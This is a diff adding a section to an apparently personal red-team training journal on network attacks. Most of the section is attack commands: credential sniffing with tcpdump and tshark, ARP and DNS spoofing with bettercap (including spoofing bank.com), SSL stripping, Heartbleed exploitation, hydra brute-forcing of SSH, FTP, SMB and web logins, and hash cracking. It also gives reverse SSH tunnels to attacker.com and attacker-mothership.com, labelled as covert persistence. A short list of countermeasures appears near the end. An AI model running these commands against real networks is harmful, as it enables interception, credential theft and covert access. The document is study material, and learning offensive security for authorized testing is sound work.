@@ -2455,3 +2455,196 @@ Regular service patching and updates
 
 OPERATIONAL NOTES: Clear-text protocols remain prevalent in enterprise environments despite known security risks. Mastery of manual service interaction provides Red Teams with low-detection methods for intelligence gathering and initial access, particularly in legacy systems and misconfigured services.
 
+# Red Monster Journey 🐲 
+## Advanced Network Attacks & Cryptographic Exploitation
+
+### 🎯 MODULE COMPLETION: PROTOCOLS & SERVICES 2
+**Status:** Mastered ✅
+**Red Team Application:** Network Interception & Authentication Bypass
+
+### 🔴 ADVANCED NETWORK ATTACKS TRADECRAFT DOCUMENTATION
+
+#### 📊 OPERATIONAL OVERVIEW
+Advanced network attacks enable Red Teams to intercept secure communications, bypass cryptographic protections, and compromise authentication mechanisms in corporate environments.
+
+#### 🎲 ADVANCED ATTACK TECHNIQUES MASTERED
+
+##### NETWORK SNIFFING & TRAFFIC ANALYSIS
+```bash
+# Passive Traffic Interception
+tcpdump -i eth0 -w capture.pcap port 80 or port 21 or port 25
+tcpdump -i eth0 -A 'port 21'                    # FTP credential capture
+tcpdump -i eth0 -A 'port 23'                    # Telnet session capture
+
+# Advanced Analysis Tools
+wireshark                                        # GUI packet analysis
+tshark -i eth0 -f "tcp port 110" -Y "pop3"      # CLI POP3 analysis
+
+# Clear-Text Protocol Monitoring
+- FTP (Port 21): Username/password in clear-text
+- Telnet (Port 23): Entire session unencrypted  
+- HTTP (Port 80): Cookies, form data, authentication
+- SMTP (Port 25): Email content and credentials
+MAN-IN-THE-MIDDLE (MITM) ATTACKS
+bash
+# ARP Spoofing/Poisoning
+arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
+
+# BetterCap Framework (Comprehensive MITM)
+bettercap -iface eth0
+> net.probe on
+> net.recon on
+> set arp.spoof.targets 192.168.1.10
+> arp.spoof on
+> net.sniff on
+
+# DNS Spoofing
+> set dns.spoof.domains google.com,facebook.com,bank.com
+> set dns.spoof.address 192.168.1.100
+> dns.spoof on
+
+# SSL Stripping (HTTPS → HTTP)
+sslstrip -l 8080
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+TLS/SSL CRYPTOGRAPHIC ATTACKS
+bash
+# TLS Configuration Assessment
+testssl.sh https://target.com                  # Comprehensive analysis
+sslscan 192.168.1.1:443                        # Quick SSL scan
+
+# Vulnerability Scanning
+nmap -p 443 --script ssl-heartbleed 192.168.1.1    # Heartbleed
+nmap -p 443 --script ssl-poodle 192.168.1.1        # POODLE
+nmap -p 443 --script ssl-enum-ciphers 192.168.1.1  # Weak ciphers
+
+# Certificate Analysis
+openssl s_client -connect target.com:443       # Manual inspection
+sslyze --regular target.com:443                # Automated analysis
+SSH SERVICE EXPLOITATION
+bash
+# Service Identification & Enumeration
+nc -v 192.168.1.1 22                           # Banner grabbing
+nmap -sV -p22 192.168.1.1                      # Version detection
+ssh-audit 192.168.1.1                          # Security configuration audit
+
+# User Enumeration Techniques
+ssh invaliduser@192.168.1.1                    # Error message analysis
+ssh validuser@192.168.1.1                      # Compare responses
+
+# SSH Tunneling for Red Team Operations
+ssh -L 8080:internal:80 user@jumphost          # Local port forwarding
+ssh -R 2222:localhost:22 user@attacker.com     # Remote port forwarding
+ssh -D 1080 user@jumphost                      # SOCKS proxy
+PASSWORD ATTACK METHODOLOGIES
+bash
+# Hydra - Online Password Attacks
+hydra -l admin -P passwords.txt ssh://192.168.1.1
+hydra -L users.txt -P rockyou.txt ftp://192.168.1.1
+hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"
+
+# Service-Specific Attacks
+hydra -l root -P passwords.txt telnet://192.168.1.1
+hydra -l administrator -P passwords.txt smb://192.168.1.1
+hydra -l admin -P passwords.txt pop3://192.168.1.1
+
+# John the Ripper - Offline Hash Cracking
+john --wordlist=passwords.txt hashes.txt
+john --format=raw-md5 hashes.txt
+john --format=nt hashes.txt
+
+# Hashcat - GPU Accelerated Cracking
+hashcat -m 0 -a 0 hashes.txt passwords.txt      # MD5
+hashcat -m 1000 -a 0 hashes.txt passwords.txt   # NTLM
+hashcat -m 1800 -a 0 hashes.txt passwords.txt   # SHA-512
+🛠️ RED TEAM OPERATIONAL PROCEDURES
+PHASE 1: NETWORK RECONNAISSANCE & MAPPING
+bash
+# Service Discovery
+nmap -sS -sV -p21,22,23,25,53,80,110,143,443,993,995 192.168.1.0/24
+
+# TLS/SSL Assessment
+testssl.sh 192.168.1.1:443
+sslscan 192.168.1.1:443
+
+# SSH Configuration Analysis
+ssh-audit 192.168.1.1
+nmap -p22 --script ssh2-enum-algos,ssh-auth-methods 192.168.1.1
+PHASE 2: TRAFFIC INTERCEPTION POSITIONING
+bash
+# MITM Establishment
+bettercap -iface eth0
+> set arp.spoof.targets 192.168.1.10,192.168.1.20
+> arp.spoof on
+> net.sniff on
+
+# Selective Traffic Capture
+tcpdump -i eth0 -w credentials.pcap 'port 21 or port 23 or port 25 or port 110'
+tshark -i eth0 -f "tcp port 21" -Y "ftp.request.command == PASS"
+PHASE 3: CRYPTOGRAPHIC VULNERABILITY EXPLOITATION
+bash
+# TLS Vulnerability Assessment
+nmap -p443 --script ssl* 192.168.1.1
+testssl.sh --openssl-timeout 3 --color 0 192.168.1.1:443
+
+# Heartbleed Exploitation (if vulnerable)
+nmap -p443 --script ssl-heartbleed --script-args vulns.showall 192.168.1.1
+python heartbleed-poc.py -p 443 192.168.1.1
+PHASE 4: AUTHENTICATION ATTACK EXECUTION
+bash
+# Strategic Password Attacks
+hydra -L discovered_users.txt -P top_passwords.txt -t 4 -W 3 ssh://192.168.1.1
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f http-post-form://192.168.1.1/login.php:username=^USER^&password=^PASS^:Invalid
+
+# Service-Specific Credential Testing
+for service in ssh ftp http-post-form; do
+    hydra -L users.txt -P passwords.txt $service://192.168.1.1
+done
+PHASE 5: PERSISTENT ACCESS ESTABLISHMENT
+bash
+# SSH Tunneling for Covert Access
+ssh -o StrictHostKeyChecking=no -R 3322:localhost:22 user@attacker-mothership.com
+
+# SOCKS Proxy for Network Pivoting
+ssh -D 1080 -N -f user@compromised-host.com
+
+# Local Port Forwarding for Internal Access
+ssh -L 8080:internal-web:80 user@jumphost
+ssh -L 3389:internal-windows:3389 user@jumphost
+📈 RISK ASSESSMENT
+Detection Risk: MEDIUM-HIGH (Active interception & attacks)
+
+Operational Value: VERY HIGH (Credential access & persistence)
+
+Technical Complexity: HIGH (Requires multiple skill domains)
+
+🔧 DEFENSIVE COUNTERMEASURES UNDERSTOOD
+Network segmentation and VLAN isolation
+
+Certificate pinning and HSTS implementation
+
+ARP inspection and DHCP snooping
+
+Intrusion Detection Systems for MITM patterns
+
+Rate limiting and account lockout policies
+
+Multi-factor authentication implementation
+
+Encrypted protocols exclusively (SSH, HTTPS, etc.)
+
+🚀 PROGRESSION IN RED TEAM SKILL MATRIX
+✅ Web Application Security
+✅ Database Security
+✅ Stealth Intelligence Gathering
+✅ Direct Engagement Operations
+✅ Network Host Discovery
+✅ Port & Service Enumeration
+✅ Advanced Firewall Evasion
+✅ Comprehensive Service Profiling
+✅ Protocol-Level Exploitation
+✅ Advanced Network Attacks ← PROTOCOLS & SERVICES 2 ADDED
+◽ Vulnerability Assessment
+◽ Privilege Escalation
+
+OPERATIONAL NOTES: Advanced network attacks represent the intersection of networking knowledge, cryptographic understanding, and operational tradecraft. Successful execution requires careful planning to avoid detection while maximizing intelligence gathering and access establishment capabilities.
